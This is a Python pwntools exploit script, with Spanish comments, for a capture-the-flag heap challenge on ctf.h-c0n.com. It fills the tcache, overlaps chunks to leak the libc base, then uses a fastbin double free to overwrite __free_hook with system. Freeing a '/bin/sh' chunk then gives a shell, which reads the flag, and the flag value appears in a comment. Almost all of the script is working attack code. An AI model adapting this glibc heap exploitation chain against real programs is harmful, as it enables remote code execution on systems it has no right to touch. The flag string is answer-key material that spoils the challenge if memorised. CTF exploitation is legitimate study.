#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host ctf.h-c0n.com --port 60002 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall2')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'ctf.h-c0n.com'
port = int(args.PORT or 60003)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

def add(idx, size, content=None):
    io.sendline("1")
    io.sendline(str(idx))
    io.sendline(str(size))

    payload = content
    if payload==None:
        payload = str(idx)*size
    io.sendafter("Paper's content: ", payload)

def fix(idx, pos, bytecontent):
    io.sendline("2")
    io.sendlineafter("Paper's index: ", str(idx))
    io.sendlineafter("Which typo do you want to fix?: ", str(pos))
    io.sendlineafter("Fix's content: ", bytecontent)

def delete(idx):
    io.sendline("3")
    io.sendlineafter("Paper's index: ", str(idx))

def dump(idx, read=False):
    io.sendline("4")
    io.sendlineafter("Paper's index: ", str(idx))
    if read:
        return io.recvline()



io = start()

io.recvuntil(">> ")


# Llenamos el tcache para los tamaños de chunk que usamos
for i in range(7):
    add(0,0x68)
    delete(0)
    add(0,0xe0 - 8)
    delete(0)
    add(0,0x1e0 - 8)
    delete(0)

# Creamos 3 chunks, el primero de ellos solamente para poder utilizar la opción fix del reto
add(0, 0xf8)
add(1, 0xf8)
add(2, 0xf8, "p"*0xd8 + pack(0x21)) 

# Modificamos el tamaño del chunk 1. Le ampliamos su tamaño, y lo liberamos.
fix(0, 0xf8, "\xe1")
delete(1)

# Creamos un chunk hasta el límite del chunk 2
add(0, 0xf8)

# Creamos otro chunk que solape con 2
add(0, 0xd8)

# Liberamos el chunk2 original
delete(2)

# Dumpeamos y sacamos el mainarena y libc base
dump(0)
leak = unpack( io.recv(6).ljust(8,"\x00") )
libc = exe.libc
libc.address = leak - 0x1e4ca0 
__free_hook = libc.sym['__free_hook'] 
__malloc_hook = libc.sym['__malloc_hook']

log.info("leak        . %16x", leak)
log.info("libc address. %16x", libc.address)
log.info("free_hook:    %16x", __free_hook)
log.info("malloc_hook:  %16x", __malloc_hook)


# Sobrescribit __free_hook con system

c=0
# Empezamos en el primer 0x7f que encontramos
fake_address = __free_hook - 0xedb - 8
# Paramos cuando el nuevo chunk vaya a estar solapando a free_hook
while fake_address + 0x60 < __free_hook:
    c+=1
    log.info("[%d] Creando chunk en %16x", c, fake_address)
    # Escribimos el 0x7f en la posición 0x60
    add(1,0x68, "\x00" * 0x5f + "\x7f") 

    # Creamos chunks y los liberamos. Usando double free podemos modificar ->fd
    add(0,0x68)
    add(1,0x68)
    add(2,0x68)
    delete(0)
    delete(1)
    delete(0)

    # Modificamos el fd del chunk para que apunte al 0x7f que acabamos de crear como size
    add(0,0x68, pack(fake_address) + pack(fake_address))
    add(2,0x68, "\x00")
    add(1,0x68, "\x00") 

    # Incrementamos la dirección objetivo    
    fake_address += 0x68 - 1 

log.info("Ahora parcheamos __free_hook")
add(1, 0x68, "\x00"*0x57 + pack(libc.sym['system']))

# Creamos un chunk con /bin/sh y lo liberamos para llamar a system
add(0, 0x20, "/bin/sh\x00")
delete(0)

io.sendline("cat flag")

# H-c0n{3b18fa02d6ef350c30967901c0c0bcbe}

io.interactive()

